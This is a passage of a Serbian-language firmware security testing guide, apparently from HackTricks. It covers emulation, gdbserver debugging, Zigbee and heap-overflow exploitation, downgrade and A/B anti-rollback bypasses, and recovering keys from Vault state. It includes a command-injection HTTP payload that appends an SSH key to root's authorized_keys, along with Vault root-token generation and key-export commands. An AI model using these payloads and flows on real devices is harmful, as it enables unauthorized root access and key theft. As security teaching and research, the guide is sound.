Zamenski init treba da preslika operativne delove originalne putanje pokretanja: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka ponuđeni blokovni uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-sisteme datoteka starog root-a, premesti novo montiranje na `/`, izvrši `chroot` i pozove `execve()` nad originalnim firmverovim `/sbin/init`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk, montiran samo za čitanje, obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju offline image-a

Pregledajte trajno stanje van guest-a kada sporo podizanje sistema, destruktivne startup skripte ili nepouzdano logovanje konzole otežavaju utvrđivanje uzroka greške. Nikada nemojte priključivati overlay koji koristi pokrenuti VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Radi ponovljivog izolovanja grešaka, upisujte vremenski označene marker datoteke na stabilan volumen u koji može da se upisuje i proverite ih van mreže; `/dev/kmsg`, FIFO datoteke i prolazne konzole mogu da daju lažno negativne rezultate zbog ograničavanja učestalosti upisa ili ranog prekida procesa. Takođe uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, funkcije ext4 sistema datoteka na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram DRI ABI-ja upravljačkog programa i naziva upravljačkog programa izvedenih iz PCI podataka. Komponenta može da postoji, pa čak i da se uspešno učita pomoću `dlopen()`, a da i dalje ne može da se koristi jer njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Neophodno je zadržati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će ponekad biti potrebno ponovo pokrenuti emulator. Analizom treba ponovo obuhvatiti sistem datoteka, iskoristiti izložene veb-stranice i mrežne servise i istražiti ranjivosti bootloadera. Testovi integriteta firmware-a ključni su za otkrivanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i otkrivanje ranjivosti fuzzing-om i drugim tehnikama.

Za ugrađene ciljne sisteme bez potpunog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa udaljene lokacije:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee poruka / radio-ko-procesora

U IoT čvorištima RF stek je često podeljen između **radio MCU-a** i Linux korisničkog procesa. Koristan postupak je da mapirate putanju:<sup>[[8]](#references)</sup>

1. **RF okvir** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **serijski/UART tekstualni ili TLV protokol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom demonu
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura pruža dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio-okvire u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i dispečerske tabele
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji su rukovaoci dostupni samo tokom faza **uparivanja**, otkrivanja ili preuzimanja firmvera/modela

Za Zigbee, snimite saobraćaj tokom uparivanja i proverite da li se cilj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje saobraćaja tokom uparivanja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista nameće.

### Rukovaoci protokola specifični za proizvođača i dostupnost ograničena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera jer pokreću **prilagođeni kod za parsiranje** i interne **FSM-ove** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obrnutim inženjeringom analizirajte dispečer komandi dok ne pronađete **rukovalac dostupan samo proizvođaču**.
- Utvrdite tabele za **stanje FSM-a**, **događaj**, **proveru**, **akciju** i **sledeće stanje**.
- Identifikujte **prelazna stanja** koja automatski napreduju i grane za retry/error koje na kraju resetuju ili oslobađaju stanje kojim upravlja napadač.
- Potvrdite koje legitimne razmene protokola su potrebne da bi se demon doveo u ranjivo stanje, umesto da pretpostavite kako je ranjivi rukovalac uvek dostupan.

Kod protokola osetljivih na tajming, reprodukcija paketa pomoću Python okruženja može biti prespora. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) pomoću steka namenjenog proizvođačima, kako biste mogli da izložite odgovarajuće **krajnje tačke**, **atribute** i tajming uparivanja.

### Klasa grešaka pri fragmentiranom preuzimanju u ugrađenim daemonima

Ponavljajuća klasa grešaka u firmveru javlja se pri **fragmentiranim preuzimanjima blob/model/konfiguracija**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) postavlja `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo polja kontrolisana napadačem koja važe za **pojedinačni paket**, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je veličina u okviru **prvobitno alocirane memorije**.

Napadač može da pošalje:

- Prvi ispravan fragment sa deklarisanom **malom** ukupnom veličinom, kako bi izazvao malu alokaciju na heap-u.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Lažiranu veličinu koja važi za pojedinačni paket i zadovoljava nove provere, ali i dalje izaziva prelivanje prvobitno alociranog bafera.

Kada je ranjiva putanja zaštićena logikom uparivanja, eksploatacija mora da uključi dovoljno **emulacije uređaja** da bi se cilj doveo u očekivano stanje za preuzimanje modela ili blob-a pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U ugrađenim daemonima, najlakši način za pokretanje eksploatacije metapodataka heap-a često nije „čekanje na čišćenje“, već **izazivanje sopstvene obrade grešaka protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM prebacili u stanja **retry** ili **error**.
- Pređite prag ponovnih pokušaja, tako da demon **resetuje kontekst** i oslobodi oštećeni bafer.
- Iskoristite ovaj predvidljivi `free()` za pokretanje primitiva na strani alokatora pre nego što se proces sruši iz nekog drugog razloga.

Ovo je naročito korisno protiv alokatora nalik **musl/uClibc/dlmalloc** u ugrađenom Linuxu, gde oštećivanje metapodataka chunk-a može da pretvori unlink/unbin logiku u primitiv za upis. Stabilan obrazac je da se ošteti **polje veličine** kako bi se obilazak alokatora preusmerio na **lažne chunk-ove pripremljene unutar prepunjenog bafera**, umesto da se odmah oštete pokazivači stvarnih bin-ova i sruši proces.

## Binarna eksploatacija i proof-of-concept

Razvoj PoC-a za identifikovane ranjivosti zahteva temeljno razumevanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Zaštite binarnog okruženja u ugrađenim sistemima su retke, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o eksploataciji uClibc fastbin-a (ugrađeni Linux)

- **Fastbin-ovi + konsolidacija:** uClibc koristi fastbin-ove slične glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki lažni chunk mora da prođe provere (ispravna veličina, `fd = 0` i okolni chunk-ovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese unutar binarne datoteke u `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na ispravno zaglavlje heap chunk-a kako bi fastbin alokacija dospela u **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može da zaustavi parsiranje, a da se pritom sačuvaju naredni bajtovi pod kontrolom napadača za stack pivot/ROP lanac.
- **Shellcode preko `/proc/self/mem`:** ROP lanac koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da postavi izvršivi shellcode u poznato mapiranje i da skoči na njega.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju unapred konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i penetration testing-u IoT uređaja. Štedi mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih sistema, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmvera.

## Napadi vraćanjem firmvera na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač primenjuje kriptografske provere potpisa za slike firmvera, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se upisuje, napadač može legitimno da instalira **stariji, ranjivi firmver sa važećim potpisom** i tako ponovo uvede zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Uobičajeni tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili stranice za podršku proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz direktorijuma `assets/firmware/` unutar Android APK-a).
   * Pronađite je u repozitorijumima trećih strana kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite sliku na uređaj ili je poslužite uređaju** preko dostupnog kanala za ažuriranje:
   * Web interfejs, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) krajnje tačke koje prihvataju Base64-kodirane blob-ove firmvera, dekodiraju ih na serveru i pokreću oporavak/nadogradnju.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji ponovo instalirajte najnoviju sliku ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom firmveru (vraćenom na stariju verziju), parametar `md5` direktno se nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmvera uvele su osnovni filter znakova, ali odsustvo zaštite od vraćanja na stariju verziju čini ovu ispravku beskorisnom.<sup>[[4]](#references)</sup>

### Izdvajanje firmvera iz mobilnih aplikacija

Mnogi dobavljači pakuju kompletne slike firmvera unutar pratećih mobilnih aplikacija kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updater-u kod dizajna sa A/B slotovima

Neki proizvođači implementiraju **ratchet** za sprečavanje downgrade-a, ali samo u logici *updater*-a (na primer, UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje particionoj tabeli ili metapodacima slota, zaštita od rollback-a i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmware-a sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater poredi ratchet image-a sa vrednošću sačuvanom u trajnoj memoriji i odbija starije, potpisane image-e.
- **Bootloader** ne parsira taj ratchet i proverava samo zaglavlje, CRC i potpis pre pokretanja izabranog slota.
- Aktivacija slota čuva se zasebno u particionoj tabeli ili brojaču generacije za svaki slot i nije kriptografski vezana za tačan digest firmware-a koji je validiran.

To u sistemima sa dva slota stvara primitivu **validiraj-jedan-image / pokreni-drugi-image**. Ako napadač može da navede updater da označi slot B kao sledeće odredište za pokretanje koristeći aktuelni potpisani image, a zatim da pre ponovnog pokretanja prepiše slot B, bootloader i dalje može da pokrene downgraded image jer veruje samo metapodacima slota koji su već potvrđeni.

Uobičajen obrazac zloupotrebe:

1. Učitajte **aktuelni potpisani** firmware u pasivni slot i pokrenite uobičajenu rutinu za validaciju/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni.
2. **Nemojte još da pokrećete uređaj ponovo.** U istoj sesiji ponovo pokrenite rutinu za pripremu/brisanje slota.
3. Zloupotrebite zastarelo stanje pokretanja ili zastarelu logiku izbora slota kako bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Upišite u taj slot stariji, ali i dalje potpisani firmware.
5. Preskočite rutinu za validaciju koja sprovodi ratchet i pokrenite uređaj ponovo direktno.
6. Bootloader izabere promovisani slot, proveri samo potpis/integritet i pokrene stari image.

Na šta treba obratiti pažnju pri reverznom inženjeringu A/B implementacija za ažuriranje:

- Izbor slota zasniva se na **zastavicama u trenutku pokretanja**, koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()` briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija u stilu `part_write_layout()` samo uvećava **brojač generacije** / aktivnu zastavicu i ne čuva hash validiranog image-a.
- Provere ratchet-a implementirane su u userspace-u ili updater kodu, ali **ne** u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili recovery ostavljaju slot označenim kao pokretljivim i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentifikacija *update endpoint*-a adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj pre flešovanja poredi **brojeve verzija** ili **monotoni anti-rollback brojač**?
* Da li se image proverava unutar lanca secure boot-a (npr. ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju validiranog firmware-a**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slota, da li je uređaj primoran da se ponovo pokrene ili su rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne provere ispravnosti (npr. dozvoljenu mapu particija, broj modela)?
* Da li *delimični* ili *backup* tokovi ažuriranja ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, kao polaznu tačku koristite sledeće projekte sa ranjivim firmware-om.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekat Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault stanja

Kada update image kombinuje male metapodatke u otvorenom tekstu sa velikim blob-om visoke entropije, prvo analizirajte kontejner pre nego što pokušate brute-force:<sup>[[1]](#references)</sup>

- Izlistajte zaglavlja, pomeraje i granice redova pomoću alata `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava format OpenSSL `enc`: narednih 8 bajtova je salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je nagoveštaj da je reč o RSA-2048 ciphertext-u koji obavija nasumičnu lozinku/ključ sesije firmware-a.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostaviti da služi za poverljivost.

Ako pretraga statičkih ključeva (`grep`, `strings`, PEM/PGP pretrage) ne uspe, izvršite reverzni inženjering **operativnog toka dešifrovanja** umesto da tražite samo privatne ključeve:

- Dekompajlirajte updater / binarni fajl za upravljanje i pratite ko čita šifrovani blob, koja pomoćna funkcija/API ga dešifruje i koje logičko ime ključa traži.
- U izdvojenom root filesystem-u potražite KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datoteke i init skripte.
- Tretirajte otvoreni tekst `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne KMS skripte za automatsko otpečaćivanje kao ekvivalent materijalu privatnog ključa.

Ako uređaj sadrži originalni Vault binarni fajl i backend za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne mehanizme Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Omogućite izvoz transit ključeva samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite ključ za unwrap: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ koristeći tačan par padding/hash algoritama koji koristi KMS. Neuspešna dekripcija uz PKCS#1 v1.5 i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok su uobičajene biblioteke podrazumevano podešene na SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte OpenSSL KDF koji koristi proizvođač (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Time „šifrovani firmware” postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, a zatim van mreže reprodukujte tačne parametre za unwrap + KDF**.

## Obuka i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a uz Claude: veština iskusnog stručnjaka, autonomija početnika](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT hacking: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sad me vidiš: sad si hakovan](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Iskorišćavanje Philips Hue Bridge-a putem OTA ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS на QEMU, 2. део: отклањање грешака и поправке](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: slabo XOR šifrovanje omogućava oporavak iz SPI flash memorije (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Alat za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Osvežimo znanje o hardware hacking-u, 2. deo](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Kako i zašto smo hakovali hardverski novčanik Cypherock: cela priča](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
